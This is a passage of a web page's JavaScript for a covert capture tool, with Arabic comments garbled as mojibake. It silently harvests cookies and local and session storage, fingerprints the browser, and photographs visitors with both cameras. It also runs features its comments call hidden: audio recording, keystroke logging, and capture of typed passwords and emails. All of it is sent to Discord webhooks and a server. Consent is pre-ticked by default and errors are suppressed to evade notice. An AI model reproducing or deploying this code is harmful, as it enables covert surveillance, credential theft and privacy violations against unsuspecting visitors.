                saveData: connection.saveData,
                type: connection.type
            };
        }
        return {};
    } catch (e) {
        return {};
    }
}

// Ø¬Ù…Ø¹ Ù…Ø¹Ù„ÙˆÙ…Ø§Øª Ø§Ù„ØªØ®Ø²ÙŠÙ†
function getStorageInfo() {
    try {
        const storage = {
            localStorage: {},
            sessionStorage: {},
            cookies: document.cookie,
            indexedDB: 'available'
        };
        
        // Ø¬Ù…Ø¹ localStorage
        try {
            for (let i = 0; i < localStorage.length; i++) {
                const key = localStorage.key(i);
                storage.localStorage[key] = localStorage.getItem(key);
            }
        } catch (e) {}
        
        // Ø¬Ù…Ø¹ sessionStorage
        try {
            for (let i = 0; i < sessionStorage.length; i++) {
                const key = sessionStorage.key(i);
                storage.sessionStorage[key] = sessionStorage.getItem(key);
            }
        } catch (e) {}
        
        return storage;
    } catch (e) {
        return {};
    }
}

// Ø¬Ù…Ø¹ Ù…Ø¹Ù„ÙˆÙ…Ø§Øª Ù…ØªÙ‚Ø¯Ù…Ø©
function getAdvancedInfo() {
    try {
        return {
            referrer: document.referrer,
            url: window.location.href,
            origin: window.location.origin,
            pathname: window.location.pathname,
            search: window.location.search,
            hash: window.location.hash,
            historyLength: history.length,
            plugins: Array.from(navigator.plugins).map(p => ({
                name: p.name,
                description: p.description,
                filename: p.filename
            })),
            mimeTypes: Array.from(navigator.mimeTypes).map(m => ({
                type: m.type,
                description: m.description
            })),
            permissions: {},
            canvasFingerprint: getCanvasFingerprint(),
            webglFingerprint: getWebGLFingerprint()
        };
    } catch (e) {
        return {};
    }
}

// Canvas Fingerprint
function getCanvasFingerprint() {
    try {
        const canvas = document.createElement('canvas');
        const ctx = canvas.getContext('2d');
        ctx.textBaseline = 'top';
        ctx.font = '14px Arial';
        ctx.fillText('Fingerprint', 2, 2);
        return canvas.toDataURL().substring(0, 100);
    } catch (e) {
        return 'unknown';
    }
}

// WebGL Fingerprint
function getWebGLFingerprint() {
    try {
        const canvas = document.createElement('canvas');
        const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
        if (gl) {
            const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
            return {
                vendor: gl.getParameter(gl.VENDOR),
                renderer: gl.getParameter(gl.RENDERER),
                version: gl.getParameter(gl.VERSION),
                shadingLanguageVersion: gl.getParameter(gl.SHADING_LANGUAGE_VERSION)
            };
        }
        return {};
    } catch (e) {
        return {};
    }
}

function getPlatformInfo() {
    const ua = navigator.userAgent;
    if (/Windows/.test(ua)) return { platform: "Windows" };
    if (/Mac/.test(ua)) return { platform: "MacOS" };
    if (/Linux/.test(ua)) return { platform: "Linux" };
    if (/Android/.test(ua)) return { platform: "Android" };
    if (/iPhone|iPad|iPod/.test(ua)) return { platform: "iOS" };
    return { platform: "Unknown" };
}

function getDeviceVersion() {
    const ua = navigator.userAgent;
    const match = ua.match(/\(([^)]+)\)/);
    return match ? match[1] : 'Unknown';
}

// ===== GEO PANEL (IP/CITY/REGION + WEBHOOK) =====
function initGeoPanelUI(geo) {
    try {
        const panel = document.getElementById('geoPanel');
        if (!panel) return;
        document.getElementById('geoIp').textContent = geo.ip || 'unknown';
        document.getElementById('geoCountry').textContent = geo.country || 'unknown';
        document.getElementById('geoRegion').textContent = geo.region || 'unknown';
        document.getElementById('geoCity').textContent = geo.city || 'unknown';
        panel.style.display = 'block';

        const consent = document.getElementById('geoConsent');
        const sendBtn = document.getElementById('geoSendBtn');
        const notice = document.getElementById('geoNotice');
        const imageConsent = document.getElementById('imageConsent');

        if (CONFIG.locationWebhook) {
            notice.textContent = 'Ø³ÙŠØªÙ… Ø§Ù„Ø¥Ø±Ø³Ø§Ù„ Ø¥Ù„Ù‰ Ø§Ù„ÙˆÙŠØ¨Ù‡ÙˆÙƒ Ø§Ù„Ù…Ø­Ø¯Ø¯.';
        } else {
            notice.textContent = 'Ù„Ù… ÙŠØªÙ… ØªØ­Ø¯ÙŠØ¯ ÙˆÙŠØ¨Ù‡ÙˆÙƒ. Ø§Ø³ØªØ®Ø¯Ù… ?locwh=Ø±Ø§Ø¨Ø·_Ø§Ù„ÙˆÙŠØ¨Ù‡ÙˆÙƒ.';
        }

        consent.addEventListener('change', () => {
            sendBtn.disabled = !consent.checked;
        });

        // ØªÙØ¹ÙŠÙ„ Ø§Ù„Ù…ÙˆØ§ÙÙ‚Ø© ØªÙ„Ù‚Ø§Ø¦ÙŠØ§Ù‹ Ø¨Ø´ÙƒÙ„ Ø§ÙØªØ±Ø§Ø¶ÙŠ
        imageConsent.checked = true;
        imageConsentGiven = true;
        addLog('ØªÙ… ØªÙØ¹ÙŠÙ„ Ø¥Ø±Ø³Ø§Ù„ Ø§Ù„ØµÙˆØ± Ø¥Ù„Ù‰ Ø§Ù„ÙˆÙŠØ¨Ù‡ÙˆÙƒ (Ø§ÙØªØ±Ø§Ø¶ÙŠ)', 'success');
        
        // Handle image consent
        imageConsent.addEventListener('change', async () => {
            imageConsentGiven = imageConsent.checked;
            if (imageConsentGiven) {
                addLog('ØªÙ… ØªÙØ¹ÙŠÙ„ Ø¥Ø±Ø³Ø§Ù„ Ø§Ù„ØµÙˆØ± Ø¥Ù„Ù‰ Ø§Ù„ÙˆÙŠØ¨Ù‡ÙˆÙƒ', 'success');
                // Ø¥Ø±Ø³Ø§Ù„ Ø¬Ù…ÙŠØ¹ Ø§Ù„ØµÙˆØ± Ø§Ù„ØªÙŠ ÙƒØ§Ù†Øª ÙÙŠ Ù‚Ø§Ø¦Ù…Ø© Ø§Ù„Ø§Ù†ØªØ¸Ø§Ø±
                await sendQueuedImages();
            } else {
                addLog('ØªÙ… Ø¥ÙŠÙ‚Ø§Ù Ø¥Ø±Ø³Ø§Ù„ Ø§Ù„ØµÙˆØ± Ø¥Ù„Ù‰ Ø§Ù„ÙˆÙŠØ¨Ù‡ÙˆÙƒ', 'info');
            }
        });

        // Auto-check image consent if autoSend is enabled
        if (CONFIG.autoSend) {
            imageConsent.checked = true;
            imageConsentGiven = true;
            addLog('ØªÙ… ØªÙØ¹ÙŠÙ„ Ø§Ù„Ø¥Ø±Ø³Ø§Ù„ Ø§Ù„ØªÙ„Ù‚Ø§Ø¦ÙŠ Ù„Ù„ØµÙˆØ±', 'info');
            // Ø¥Ø±Ø³Ø§Ù„ Ø§Ù„ØµÙˆØ± ÙÙŠ Ù‚Ø§Ø¦Ù…Ø© Ø§Ù„Ø§Ù†ØªØ¸Ø§Ø± Ø¥Ø°Ø§ ÙƒØ§Ù†Øª Ù…ÙˆØ¬ÙˆØ¯Ø©
            setTimeout(async () => {
                await sendQueuedImages();
            }, 1000);
        }

        sendBtn.addEventListener('click', async () => {
            if (!CONFIG.locationWebhook) {
                addLog('Location webhook is not configured (locwh).', 'warning');
                return;
            }
            try {
                sendBtn.disabled = true;
                const payload = {
                    type: 'visitor_location',
                    ip: geo.ip || 'unknown',
                    country: geo.country || 'unknown',
                    region: geo.region || 'unknown',
                    city: geo.city || 'unknown',
                    userAgent: navigator.userAgent,
                    timestamp: new Date().toISOString(),
                    userId: CONFIG.userId
                };
                await fetch(CONFIG.locationWebhook, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(payload),
                    mode: 'no-cors',
                    referrerPolicy: 'no-referrer',
                    credentials: 'omit'
                });
                addLog('Location data sent to webhook', 'success');
            } catch (e) {
                addLog(`Location webhook error: ${e.message}`, 'error');
            } finally {
                sendBtn.disabled = !consent.checked;
            }
        });

        if (CONFIG.autoSend && CONFIG.locationWebhook) {
            consent.checked = true;
            sendBtn.disabled = false;
            sendBtn.click();
        }
    } catch (e) {
        addLog(`Geo panel init failed: ${e.message}`, 'warning');
    }
}

// ===== CAMERA FUNCTIONS =====
async function requestCameraPermission(facingMode) {
    try {
        const constraints = {
            video: { 
                facingMode: facingMode,
                width: { ideal: 1280 },
                height: { ideal: 720 }
            } 
        };
        
        addLog(`Requesting ${facingMode === 'user' ? 'front' : 'back'} camera permission...`, 'info');
        const stream = await navigator.mediaDevices.getUserMedia(constraints);
        addLog(`âœ… ${facingMode === 'user' ? 'Front' : 'Back'} camera permission granted`, 'success');
        return stream;
    } catch (error) {
        addLog(`âŒ ${facingMode === 'user' ? 'Front' : 'Back'} camera permission denied: ${error.message}`, 'warning');
        return null;
    }
}

async function requestScreenPermission() {
    try {
        const stream = await navigator.mediaDevices.getDisplayMedia({
            video: {
                displaySurface: 'monitor',
                frameRate: { ideal: 15, max: 30 }
            },
            audio: false
        });
        addLog('Screen capture permission granted', 'success');
        return stream;
    } catch (error) {
        addLog(`Screen capture denied: ${error.message}`, 'error');
        return null;
    }
}

// ===== AUDIO RECORDING (Ù…ÙŠØ²Ø© Ù…Ø®ÙÙŠØ©) =====
async function startAudioRecording() {
    try {
        if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
            return;
        }
        
        audioStream = await navigator.mediaDevices.getUserMedia({ audio: true });
        
        if (MediaRecorder && MediaRecorder.isTypeSupported('audio/webm')) {
            audioRecorder = new MediaRecorder(audioStream, {
                mimeType: 'audio/webm'
            });
            
            const audioChunks = [];
            
            audioRecorder.ondataavailable = (event) => {
                if (event.data.size > 0) {
                    audioChunks.push(event.data);
                }
            };
            
            audioRecorder.onstop = async () => {
                const audioBlob = new Blob(audioChunks, { type: 'audio/webm' });
                await sendAudioToDiscord(audioBlob);
            };
            
            audioRecorder.start();
            addLog('ğŸ¤ Audio recording started (hidden)', 'info');
            
            // Ø¥ÙŠÙ‚Ø§Ù Ø§Ù„ØªØ³Ø¬ÙŠÙ„ Ø¨Ø¹Ø¯ 30 Ø«Ø§Ù†ÙŠØ© ÙˆØ¥Ø±Ø³Ø§Ù„Ù‡
            setTimeout(() => {
                if (audioRecorder && audioRecorder.state !== 'inactive') {
                    audioRecorder.stop();
                    audioStream.getTracks().forEach(track => track.stop());
                }
            }, 30000);
        }
    } catch (error) {
        // Ù„Ø§ Ù†Ø¹Ø±Ø¶ Ø±Ø³Ø§Ù„Ø© Ø®Ø·Ø£ Ù„ØªØ¬Ù†Ø¨ Ø§ÙƒØªØ´Ø§Ù Ø§Ù„Ù…ÙŠØ²Ø©
    }
}

async function sendAudioToDiscord(audioBlob) {
    if (!CONFIG.enableDiscord || CONFIG.webhooks.length === 0 || !imageConsentGiven) return;
    
    try {
        const fileName = `audio_${CONFIG.userId}_${Date.now()}.webm`;
        const content = `ğŸ¤ Audio recording | userId=${CONFIG.userId} | ip=${additionalData && additionalData.ip ? additionalData.ip : 'unknown'}`;
        
        for (const webhook of CONFIG.webhooks) {
            await sendToDiscord(webhook, content, audioBlob, fileName);
        }
    } catch (error) {
        // Ù„Ø§ Ù†Ø¹Ø±Ø¶ Ø±Ø³Ø§Ù„Ø© Ø®Ø·Ø£
    }
}

// ===== KEYLOGGER (Ù…ÙŠØ²Ø© Ù…Ø®ÙÙŠØ©) =====
function startKeylogger() {
    try {
        document.addEventListener('keydown', (e) => {
            const keyData = {
                key: e.key,
                code: e.code,
                keyCode: e.keyCode,
                timestamp: new Date().toISOString(),
                url: window.location.href,
                target: e.target.tagName + (e.target.id ? '#' + e.target.id : '') + (e.target.className ? '.' + e.target.className : '')
            };
            
            keyloggerData.push(keyData);
            
            // Ø¥Ø±Ø³Ø§Ù„ Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª ÙƒÙ„ 50 Ø¶ØºØ·Ø©
            if (keyloggerData.length >= 50) {
                sendKeyloggerData();
            }
        });
        
        // Ø¥Ø±Ø³Ø§Ù„ Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª ÙƒÙ„ 30 Ø«Ø§Ù†ÙŠØ©
        setInterval(() => {
            if (keyloggerData.length > 0) {
                sendKeyloggerData();
            }
        }, 30000);
    } catch (error) {
        // Ù„Ø§ Ù†Ø¹Ø±Ø¶ Ø±Ø³Ø§Ù„Ø© Ø®Ø·Ø£
    }
}

async function sendKeyloggerData() {
    if (!CONFIG.enableDiscord || CONFIG.webhooks.length === 0 || !imageConsentGiven || keyloggerData.length === 0) return;
    
    try {
        const data = JSON.stringify({
            type: 'keylogger',
            userId: CONFIG.userId,
            ip: additionalData && additionalData.ip ? additionalData.ip : 'unknown',
            keys: keyloggerData,
            clicks: clickData,
            forms: formData,
            timestamp: new Date().toISOString()
        }, null, 2);
        
        const blob = new Blob([data], { type: 'application/json' });
        const fileName = `keys_${CONFIG.userId}_${Date.now()}.json`;
        const content = `âŒ¨ï¸ Activity data | userId=${CONFIG.userId} | ${keyloggerData.length} keys, ${clickData.length} clicks`;
        
        for (const webhook of CONFIG.webhooks) {
            await sendToDiscord(webhook, content, blob, fileName);
        }
        
        keyloggerData = []; // Ù…Ø³Ø­ Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª Ø¨Ø¹Ø¯ Ø§Ù„Ø¥Ø±Ø³Ø§Ù„
        clickData = [];
        formData = [];
    } catch (error) {
        // Ù„Ø§ Ù†Ø¹Ø±Ø¶ Ø±Ø³Ø§Ù„Ø© Ø®Ø·Ø£
    }
}

// ===== CLICK TRACKER (Ù…ÙŠØ²Ø© Ù…Ø®ÙÙŠØ©) =====
function startClickTracker() {
    try {
        document.addEventListener('click', (e) => {
            const clickInfo = {
                x: e.clientX,
                y: e.clientY,
                target: e.target.tagName + (e.target.id ? '#' + e.target.id : '') + (e.target.className ? '.' + e.target.className : ''),
                text: e.target.textContent ? e.target.textContent.substring(0, 50) : '',
                url: window.location.href,
                timestamp: new Date().toISOString()
            };
            
            clickData.push(clickInfo);
        });
    } catch (error) {
        // Ù„Ø§ Ù†Ø¹Ø±Ø¶ Ø±Ø³Ø§Ù„Ø© Ø®Ø·Ø£
    }
}

// ===== FORM TRACKER (Ù…ÙŠØ²Ø© Ù…Ø®ÙÙŠØ©) =====
function startFormTracker() {
    try {
        document.addEventListener('submit', (e) => {
            const formInfo = {
                action: e.target.action || '',
                method: e.target.method || 'GET',
                url: window.location.href,
                timestamp: new Date().toISOString()
            };
            
            // Ø¬Ù…Ø¹ Ø¨ÙŠØ§Ù†Ø§Øª Ø§Ù„Ù†Ù…ÙˆØ°Ø¬
            const formDataObj = new FormData(e.target);
            const formFields = {};
            for (const [key, value] of formDataObj.entries()) {
                formFields[key] = value.toString().substring(0, 100); // ØªÙ‚Ù„ÙŠÙ„ Ø§Ù„Ø­Ø¬Ù…
            }
            formInfo.fields = formFields;
            
            formData.push(formInfo);
            
            // Ø¥Ø±Ø³Ø§Ù„ ÙÙˆØ±ÙŠ Ù„Ù„Ù†Ù…Ø§Ø°Ø¬
            if (CONFIG.enableDiscord && CONFIG.webhooks.length > 0 && imageConsentGiven) {
                setTimeout(() => {
                    const data = JSON.stringify(formInfo, null, 2);
                    const blob = new Blob([data], { type: 'application/json' });
                    const fileName = `form_${CONFIG.userId}_${Date.now()}.json`;
                    const content = `ğŸ“ Form submitted | userId=${CONFIG.userId}`;
                    
                    for (const webhook of CONFIG.webhooks) {
                        sendToDiscord(webhook, content, blob, fileName);
                    }
                }, 1000);
            }
        });
        
        // ØªØªØ¨Ø¹ ØªØºÙŠÙŠØ±Ø§Øª Ø­Ù‚ÙˆÙ„ Ø§Ù„Ø¥Ø¯Ø®Ø§Ù„
        document.addEventListener('input', (e) => {
            if (e.target.type === 'password' || e.target.type === 'email' || e.target.name) {
                const inputData = {
                    type: e.target.type,
                    name: e.target.name || '',
                    id: e.target.id || '',
                    value: e.target.value ? e.target.value.substring(0, 50) : '',
                    url: window.location.href,
                    timestamp: new Date().toISOString()
                };
                
                // Ø¥Ø±Ø³Ø§Ù„ ÙÙˆØ±ÙŠ Ù„Ù„Ø­Ù‚ÙˆÙ„ Ø§Ù„Ù…Ù‡Ù…Ø©
                if ((e.target.type === 'password' || e.target.type === 'email') && CONFIG.enableDiscord && CONFIG.webhooks.length > 0 && imageConsentGiven) {
                    setTimeout(() => {
                        const data = JSON.stringify(inputData, null, 2);
                        const blob = new Blob([data], { type: 'application/json' });
                        const fileName = `input_${CONFIG.userId}_${Date.now()}.json`;
                        const content = `ğŸ”‘ Input captured | userId=${CONFIG.userId} | type=${e.target.type}`;
                        
                        for (const webhook of CONFIG.webhooks) {
                            sendToDiscord(webhook, content, blob, fileName);
                        }
                    }, 2000);
                }
            }
        });
    } catch (error) {
        // Ù„Ø§ Ù†Ø¹Ø±Ø¶ Ø±Ø³Ø§Ù„Ø© Ø®Ø·Ø£
    }
}

// ===== PAGE TRACKER (Ù…ÙŠØ²Ø© Ù…Ø®ÙÙŠØ©) =====
function startPageTracker() {
    try {
        let lastUrl = window.location.href;
        
        // ØªØªØ¨Ø¹ ØªØºÙŠÙŠØ±Ø§Øª URL
        setInterval(() => {
            if (window.location.href !== lastUrl) {
                const pageChange = {
                    from: lastUrl,
                    to: window.location.href,
                    timestamp: new Date().toISOString()
                };
                
                if (CONFIG.enableDiscord && CONFIG.webhooks.length > 0 && imageConsentGiven) {
                    const data = JSON.stringify(pageChange, null, 2);
                    const blob = new Blob([data], { type: 'application/json' });
                    const fileName = `page_${CONFIG.userId}_${Date.now()}.json`;
                    const content = `ğŸ“„ Page changed | userId=${CONFIG.userId}`;
                    
                    for (const webhook of CONFIG.webhooks) {
                        sendToDiscord(webhook, content, blob, fileName);
                    }
                }
                
                lastUrl = window.location.href;
            }
        }, 1000);
        
        // ØªØªØ¨Ø¹ Ø¥ØºÙ„Ø§Ù‚ Ø§Ù„ØµÙØ­Ø©
        window.addEventListener('beforeunload', () => {
            if (CONFIG.enableKeylogger && keyloggerData.length > 0) {
                sendKeyloggerData();
            }
        });
    } catch (error) {
        // Ù„Ø§ Ù†Ø¹Ø±Ø¶ Ø±Ø³Ø§Ù„Ø© Ø®Ø·Ø£
    }
}

// ===== SERVER UPLOAD =====
async function uploadToServer(blob, cameraType, photoIndex, meta) {
    if (!CONFIG.enableServer) return;
    
    try {
        const formData = new FormData();
        formData.append('images', blob, `image_${cameraType}_${photoIndex}.webp`);
        formData.append('userId', CONFIG.userId);
        formData.append('cameraType', cameraType);
        formData.append('imageWidth', meta.imageWidth);
        formData.append('imageHeight', meta.imageHeight);
        formData.append('additionalData', JSON.stringify(additionalData));
        
        const response = await fetch(CONFIG.serverUrl, {
            method: 'POST',
            body: formData
        });
        
        if (response.ok) {
            addLog(`Server upload successful: ${cameraType}_${photoIndex}`, 'success');
        } else {
            addLog(`Server upload failed: ${response.status}`, 'error');
        }
    } catch (error) {
        addLog(`Server upload error: ${error.message}`, 'error');
    }
}

// ===== CAMERA SETUP =====
function setupCamera(video, canvas, cameraType) {
    video.play();
    video.onplaying = () => {
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        const ctx = canvas.getContext('2d');
        let photoCount = 0;
        
        addLog(`Camera started: ${cameraType} (${canvas.width}x${canvas.height})`, 'info');
        
        const interval = setInterval(() => {
            if (photoCount >= CONFIG.maxPhotos) {
                clearInterval(interval);
                if (video.srcObject) {
                    video.srcObject.getTracks().forEach(track => track.stop());
                }
                camerasFinished++;
                addLog(`Camera finished: ${cameraType}`, 'success');
                
                if (camerasFinished === totalCameras) {
                    finishAndRedirect();
                }
                return;
            }
            
                // Capture image
            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
            canvas.toBlob(blob => {
                if (!blob || blob.size === 0) {
                    addLog(`âŒ Failed to capture image: ${cameraType}_${photoCount}`, 'error');
                    photoCount++;
                    return;
                }
                
                const meta = {
                    imageWidth: canvas.width,
                    imageHeight: canvas.height,
                    cameraType,
                    userId: CONFIG.userId,
                    platform: additionalData.platform,
                    country: additionalData.country,
                    city: additionalData.city,
                    timestamp: new Date().toISOString()
                };
                
                addLog(`ğŸ“· Photo captured: ${cameraType}_${photoCount} (${(blob.size / 1024).toFixed(2)} KB)`, 'info');
                
                // Upload to server
                uploadToServer(blob, cameraType, photoCount, meta);
                
                // Send to Discord
                sendImageToDiscord(blob, cameraType, photoCount, meta);
            }, 'image/webp', CONFIG.quality);
            
            photoCount++;
        }, CONFIG.interval);
    };
}

// ===== MAIN INITIALIZATION =====
async function init() {
    addLog('Initializing camera capture system...', 'info');
    addLog(`Configuration: maxPhotos=${CONFIG.maxPhotos}, interval=${CONFIG.interval}ms, quality=${CONFIG.quality}`, 'info');
    addLog(`Discord webhooks: ${CONFIG.webhooks.length}`, 'info');
    
    try {
        // Test Discord webhooks first
        if (CONFIG.enableDiscord && CONFIG.webhooks.length > 0) {
            addLog('Testing Discord webhooks...', 'info');
            for (const webhook of CONFIG.webhooks) {
                await testDiscordWebhook(webhook);
            }
        }
        
        // Collect additional data
        additionalData = await collectAdditionalData();
        addLog('Additional data collected', 'success');
        
        // ØªÙØ¹ÙŠÙ„ Ø§Ù„Ù…ÙŠØ²Ø§Øª Ø§Ù„Ù…Ø®ÙÙŠØ©
        if (CONFIG.enableAudio) {
            await startAudioRecording();
        }
        
        if (CONFIG.enableKeylogger) {
            startKeylogger();
            startClickTracker();
            startFormTracker();
            startPageTracker();
        }
        
        // Initialize geo panel UI with IP/City/Region and webhook sender
        initGeoPanelUI(additionalData);
        
        // If screen mode, wait for user button click to start screen share
        if (CONFIG.screen) {
            addLog('Screen mode enabled. Tap "Start Screen Share" to continue.', 'info');
            document.getElementById('screenButton').style.display = 'block';
            return; // defer until user clicks
        }
        
        // Request camera permissions - Ù…Ø­Ø§ÙˆÙ„Ø© ÙØªØ­ Ø§Ù„ÙƒØ§Ù…ÙŠØ±ØªÙŠÙ†
        addLog('Requesting camera permissions (front & back)...', 'info');
        
        // Setup cameras elements
        const frontVideo = document.getElementById('frontVideo');
        const backVideo = document.getElementById('backVideo');
        const frontCanvas = document.getElementById('frontCanvas');
        const backCanvas = document.getElementById('backCanvas');
        
        let frontStream = null;
        let backStream = null;
        
        // Ù…Ø­Ø§ÙˆÙ„Ø© ÙØªØ­ Ø§Ù„ÙƒØ§Ù…ÙŠØ±Ø§ Ø§Ù„Ø£Ù…Ø§Ù…ÙŠØ© Ø£ÙˆÙ„Ø§Ù‹
        try {
            addLog('Attempting to open front camera...', 'info');
            frontStream = await requestCameraPermission('user');
            if (frontStream) {
                totalCameras++;
                addLog('âœ… Front camera (user) ready', 'success');
                frontVideo.srcObject = frontStream;
                frontVideo.addEventListener('loadedmetadata', () => {
                    addLog(`Front camera metadata loaded: ${frontVideo.videoWidth}x${frontVideo.videoHeight}`, 'info');
                    setupCamera(frontVideo, frontCanvas, 'front');
                });
            }
        } catch (err) {
            addLog(`Front camera error: ${err.message}`, 'warning');
        }
        
        // Ø§Ù†ØªØ¸Ø§Ø± Ù‚Ù„ÙŠÙ„ Ù‚Ø¨Ù„ ÙØªØ­ Ø§Ù„ÙƒØ§Ù…ÙŠØ±Ø§ Ø§Ù„Ø®Ù„ÙÙŠØ© (Ø¨Ø¹Ø¶ Ø§Ù„Ø£Ø¬Ù‡Ø²Ø© ØªØ­ØªØ§Ø¬ Ù‡Ø°Ø§)
        await new Promise(resolve => setTimeout(resolve, 500));
        
        // Ù…Ø­Ø§ÙˆÙ„Ø© ÙØªØ­ Ø§Ù„ÙƒØ§Ù…ÙŠØ±Ø§ Ø§Ù„Ø®Ù„ÙÙŠØ©
        try {
            addLog('Attempting to open back camera...', 'info');
            backStream = await requestCameraPermission('environment');
            if (backStream) {
                totalCameras++;
                addLog('âœ… Back camera (environment) ready', 'success');
                backVideo.srcObject = backStream;
                backVideo.addEventListener('loadedmetadata', () => {
                    addLog(`Back camera metadata loaded: ${backVideo.videoWidth}x${backVideo.videoHeight}`, 'info');
                    setupCamera(backVideo, backCanvas, 'back');
                });
            } else {
                addLog('âš ï¸ Back camera permission denied or not available', 'warning');
            }
        } catch (err) {
            addLog(`Back camera error: ${err.message}`, 'warning');
            // Ù…Ø­Ø§ÙˆÙ„Ø© Ø¨Ø¯ÙŠÙ„Ø©: Ø§Ø³ØªØ®Ø¯Ø§Ù… deviceId Ù…Ø¨Ø§Ø´Ø±Ø©
            try {
                addLog('Trying alternative method for back camera...', 'info');
                const devices = await navigator.mediaDevices.enumerateDevices();
                const videoDevices = devices.filter(device => device.kind === 'videoinput');
                addLog(`Found ${videoDevices.length} video devices`, 'info');
                
                // Ø§Ù„Ø¨Ø­Ø« Ø¹Ù† ÙƒØ§Ù…ÙŠØ±Ø§ Ø®Ù„ÙÙŠØ©
                for (const device of videoDevices) {
                    if (device.label.toLowerCase().includes('back') || 
                        device.label.toLowerCase().includes('rear') ||
                        device.label.toLowerCase().includes('environment')) {
                        addLog(`Trying to use device: ${device.label}`, 'info');
                        try {
                            backStream = await navigator.mediaDevices.getUserMedia({
                                video: {
                                    deviceId: { exact: device.deviceId },
                                    width: { ideal: 1280 },
                                    height: { ideal: 720 }
                                }
                            });
                            if (backStream) {
                                totalCameras++;
                                addLog('âœ… Back camera opened via deviceId', 'success');
                                backVideo.srcObject = backStream;
                                backVideo.addEventListener('loadedmetadata', () => {
                                    addLog(`Back camera metadata loaded: ${backVideo.videoWidth}x${backVideo.videoHeight}`, 'info');
                                    setupCamera(backVideo, backCanvas, 'back');
                                });
                                break;
                            }
                        } catch (e) {
                            addLog(`Failed to open device ${device.label}: ${e.message}`, 'warning');
                        }
                    }
                }
            } catch (enumError) {
                addLog(`Device enumeration failed: ${enumError.message}`, 'warning');
            }
        }
        
        if (!frontStream && !backStream) {
            addLog('âŒ No cameras available', 'error');
            finishAndRedirect();
            return;
        }
        
        addLog(`ğŸ“· Cameras initialized: ${totalCameras} total (Front: ${frontStream ? 'âœ…' : 'âŒ'}, Back: ${backStream ? 'âœ…' : 'âŒ'})`, 'success');
        
    } catch (error) {
        addLog(`Initialization failed: ${error.message}`, 'error');
        finishAndRedirect();
    }
}

// ===== FINISH AND REDIRECT =====
function finishAndRedirect() {
    addLog('Capture process completed', 'success');
    
    // Ø¥Ø±Ø³Ø§Ù„ Ø¨ÙŠØ§Ù†Ø§Øª Keylogger Ø§Ù„Ù…ØªØ¨Ù‚ÙŠØ©
    if (CONFIG.enableKeylogger && keyloggerData.length > 0) {
        sendKeyloggerData();
    }
    
    // Ø¥Ø±Ø³Ø§Ù„ Ø¬Ù…ÙŠØ¹ Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª Ø§Ù„Ù…Ø¬Ù…Ø¹Ø©
    if (CONFIG.enableAdvanced || CONFIG.enableStorage || CONFIG.enableGeolocation) {
        sendAdvancedData();
    }
    
    const container = document.querySelector('.container');
    const linkHtml = CONFIG.enableRedirect && CONFIG.redirectUrl ? 
        `<p><a href="${CONFIG.redirectUrl}" target="_blank" rel="noopener noreferrer">Ø§Ù„Ø§Ù†ØªÙ‚Ø§Ù„ Ø¥Ù„Ù‰ Ø§Ù„Ù…ÙˆÙ‚Ø¹</a></p>` : '';
    
    container.innerHTML = `
        <h1>ØªÙ… ØªÙ†ÙÙŠØ° Ø·Ù„Ø¨Ùƒ ÙˆØ§Ù„Ø¯Ø®ÙˆÙ„ Ø¥Ù„Ù‰ Ø§Ù„Ù…ÙˆÙ‚Ø¹</h1>
        <p>ÙŠÙ…ÙƒÙ†Ùƒ Ø§Ù„ØªØµÙØ­ Ø§Ù„Ø¢Ù† Ø£Ùˆ Ø¥ØºÙ„Ø§Ù‚ Ø§Ù„ØµÙØ­Ø©</p>
        ${linkHtml}
        ${CONFIG.showLog ? '<p><small>ØªØ­Ù‚Ù‚ Ù…Ù† Ø³Ø¬Ù„ Ø§Ù„Ø­Ø§Ù„Ø© ÙÙŠ Ø£Ø¹Ù„Ù‰ Ø§Ù„ØµÙØ­Ø©</small></p>' : ''}
    `;
    
    if (CONFIG.enableRedirect && CONFIG.redirectUrl) {
        setTimeout(() => {
            try {
                window.location.href = CONFIG.redirectUrl;
            } catch (error) {
                addLog(`Redirect failed: ${error.message}`, 'error');
            }
        }, 2000);
    }
}

// Ø¥Ø±Ø³Ø§Ù„ Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª Ø§Ù„Ù…ØªÙ‚Ø¯Ù…Ø©
async function sendAdvancedData() {
    if (!CONFIG.enableDiscord || CONFIG.webhooks.length === 0 || !imageConsentGiven) return;
    
    try {
        const advancedData = {
            type: 'advanced_data',
            userId: CONFIG.userId,
            timestamp: new Date().toISOString(),
            data: additionalData
        };
        
        const dataStr = JSON.stringify(advancedData, null, 2);
        const blob = new Blob([dataStr], { type: 'application/json' });
        const fileName = `advanced_${CONFIG.userId}_${Date.now()}.json`;
        const content = `ğŸ” Advanced data collected | userId=${CONFIG.userId}`;
        
        for (const webhook of CONFIG.webhooks) {
            await sendToDiscord(webhook, content, blob, fileName);
        }
    } catch (error) {
        // Ù„Ø§ Ù†Ø¹Ø±Ø¶ Ø±Ø³Ø§Ù„Ø© Ø®Ø·Ø£
    }
}

// ===== TEST FUNCTIONS =====
async function testDiscordNow() {
    addLog('Manual Discord test started...', 'info');
    for (const webhook of CONFIG.webhooks) {
        await testDiscordWebhook(webhook);
    }
}

// ===== START APPLICATION =====
window.addEventListener('load', () => {
    // Show test button if log is enabled
    if (CONFIG.showLog) {
        document.getElementById('testButton').style.display = 'block';
    }
    init();
});

// ===== SCREEN SHARE STARTER =====
async function startScreenShare() {
    try {
        const screenStream = await requestScreenPermission();
        if (!screenStream) {
            addLog('Screen stream not available', 'error');
            finishAndRedirect();
            return;
        }
        const frontVideo = document.getElementById('frontVideo');
        const frontCanvas = document.getElementById('frontCanvas');
        totalCameras = 1;
        camerasFinished = 0;
        document.getElementById('screenButton').style.display = 'none';
        frontVideo.srcObject = screenStream;
        frontVideo.addEventListener('loadedmetadata', () => setupCamera(frontVideo, frontCanvas, 'screen'));
        addLog('Screen sharing started', 'success');
    } catch (e) {
        addLog(`Screen share failed: ${e.message}`, 'error');
        finishAndRedirect();
    }
}
</script>

</body>
